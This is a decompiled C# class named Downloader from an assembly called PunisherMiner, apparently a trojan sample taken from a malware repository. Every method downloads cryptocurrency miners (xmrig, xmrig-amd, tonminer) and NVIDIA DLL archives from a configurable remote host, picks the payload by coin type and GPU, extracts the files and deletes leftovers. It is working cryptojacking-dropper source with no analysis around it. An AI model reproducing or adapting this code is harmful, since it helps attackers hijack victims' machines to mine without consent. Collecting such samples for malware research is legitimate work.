// Decompiled with JetBrains decompiler
// Type: Downloader
// Assembly: PunisherMiner, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 5E38855F-8014-4FAB-90F8-2AFCCACBC0F6
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan.MSIL.Tasker.gen-a984daf88ca5b95be07c38888abaac8d0f4241cc67b3fc5e8e798a5fed89bc6d.exe

using System;
using System.IO;
using System.IO.Compression;
using System.Net;

public class Downloader
{
  public static void Download()
  {
    string info = Program.GetInfo("CryptoType");
    if (!(info == "MONERO"))
    {
      if (!(info == "TON"))
      {
        if (!(info == "RAVE"))
          return;
        Downloader.DownloadForRave();
      }
      else
        Downloader.DownloadForTon();
    }
    else
      Downloader.DownloadForMonero();
  }

  private static void DownloadForRave()
  {
    switch (PcInfo.Gpu)
    {
      case GpuType.Nvidia:
        if (!System.IO.File.Exists(Settings.XmrigFile))
        {
          try
          {
            using (WebClient webClient = new WebClient())
              webClient.DownloadFile(Program.GetInfo("Host") + "xmrig.exe", Settings.XmrigFile);
          }
          catch (Exception ex)
          {
            Console.Write(ex.Message);
          }
        }
        Downloader.DownloadNvidiaDlls();
        break;
      case GpuType.AMD:
        if (System.IO.File.Exists(Settings.XmrigAmdFile))
          break;
        try
        {
          using (WebClient webClient = new WebClient())
          {
            webClient.DownloadFile(Program.GetInfo("Host") + "xmrig-amd.exe", Settings.XmrigAmdFile);
            break;
          }
        }
        catch (Exception ex)
        {
          Console.Write(ex.Message);
          break;
        }
    }
  }

  private static void DownloadForTon()
  {
    if (!Directory.Exists(Settings.TonDirectory))
      Directory.CreateDirectory(Settings.TonDirectory);
    string str = Settings.TonDirectory + "\\addon.zip";
    if (System.IO.File.Exists(str))
      return;
    foreach (FileSystemInfo file in new DirectoryInfo(Settings.TonDirectory).GetFiles())
      file.Delete();
    try
    {
      using (WebClient webClient = new WebClient())
        webClient.DownloadFile(Program.GetInfo("Host") + "tonminer.zip", str);
    }
    catch (Exception ex)
    {
      Console.Write(ex.Message);
    }
    ZipFile.ExtractToDirectory(str, Settings.TonDirectory);
    System.IO.File.Delete(str);
  }

  private static void DownloadForMonero()
  {
    if (!System.IO.File.Exists(Settings.XmrigFile))
    {
      try
      {
        using (WebClient webClient = new WebClient())
          webClient.DownloadFile(Program.GetInfo("Host") + "xmrig.exe", Settings.XmrigFile);
      }
      catch (Exception ex)
      {
        Console.Write(ex.Message);
      }
    }
    if (!Settings.UseGpu)
      return;
    switch (PcInfo.Gpu)
    {
      case GpuType.Nvidia:
        if (Directory.GetFiles(Settings.Dirtectory, "*.dll").Length != 0)
          break;
        Downloader.DownloadNvidiaDlls();
        break;
      case GpuType.AMD:
        if (System.IO.File.Exists(Settings.XmrigAmdFile))
          break;
        try
        {
          using (WebClient webClient = new WebClient())
          {
            webClient.DownloadFile(Program.GetInfo("Host") + "xmrig-amd.exe", Settings.XmrigAmdFile);
            break;
          }
        }
        catch (Exception ex)
        {
          Console.Write(ex.Message);
          break;
        }
    }
  }

  private static void DownloadNvidiaDlls()
  {
    if (!System.IO.File.Exists(Settings.NvidiaDll))
    {
      try
      {
        using (WebClient webClient = new WebClient())
          webClient.DownloadFile(Program.GetInfo("Host") + "nv-dll-1.zip", Settings.NvidiaDll);
      }
      catch
      {
      }
      try
      {
        using (WebClient webClient = new WebClient())
          webClient.DownloadFile(Program.GetInfo("Host") + "nv-dll-2.zip", Settings.NvidiaDll2);
      }
      catch
      {
      }
    }
    foreach (string file in Directory.GetFiles(Settings.Dirtectory, "*.dll"))
      System.IO.File.Delete(file);
    ZipFile.ExtractToDirectory(Settings.NvidiaDll, Settings.Dirtectory);
    ZipFile.ExtractToDirectory(Settings.NvidiaDll2, Settings.Dirtectory);
    System.IO.File.Delete(Settings.NvidiaDll);
    System.IO.File.Delete(Settings.NvidiaDll2);
  }
}
